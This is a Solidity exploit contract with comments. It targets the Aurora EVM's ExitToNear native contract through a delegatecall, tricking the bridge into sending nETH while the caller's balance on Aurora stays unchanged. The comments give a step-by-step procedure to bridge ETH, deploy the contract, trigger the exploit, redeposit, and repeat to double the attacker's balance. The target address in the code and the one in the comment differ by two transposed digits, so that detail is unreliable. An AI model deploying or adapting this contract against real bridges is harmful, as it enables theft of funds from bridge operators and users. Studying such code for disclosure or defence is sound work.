// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.7;

contract Exploit {
    address payable private owner;

    constructor() {
        owner = payable(msg.sender);
    }

    function exploit(bytes memory recipient) public payable {
        require(msg.sender == owner);

        bytes memory input = abi.encodePacked("\x00", recipient);
        uint input_size = 1 + recipient.length;

        assembly {
            let res := delegatecall(gas(), 0xe9271bc70b7ed1f598ddd3199e80b093fa71124f, add(input, 32), input_size, 0, 32)
        }

        owner.transfer(msg.value);
    }
}
//It takes the ETH value from the caller, triggers the exit event in the ExitToNear contract,
// then sends the nETH back to the caller. The nETH can be deposited into Aurora EVM again through Aurora Bridge, 
//effectively doubling the attacker’s original balance.
//Step by step:
//Bridge Ether from Ethereum to Aurora using Rainbow Bridge (Aurora Bridge)
//Deploy the malicious contract on Aurora that makes the delegatecall to the native contract ExitToNear i.e
//. 0xe9217bc70b7ed1f598ddd3199e80b093fa71124f
//Call the exploit function of the malicious contract. 
//Aurora is tricked at this point to send nETH to the caller on NEAR from the Aurora bridge contract. 
//The balance of attacker doesn’t change on Aurora
//Attacker then deposits back nETH to Aurora, doubling the attacker’s balance
//Repeat from step 3.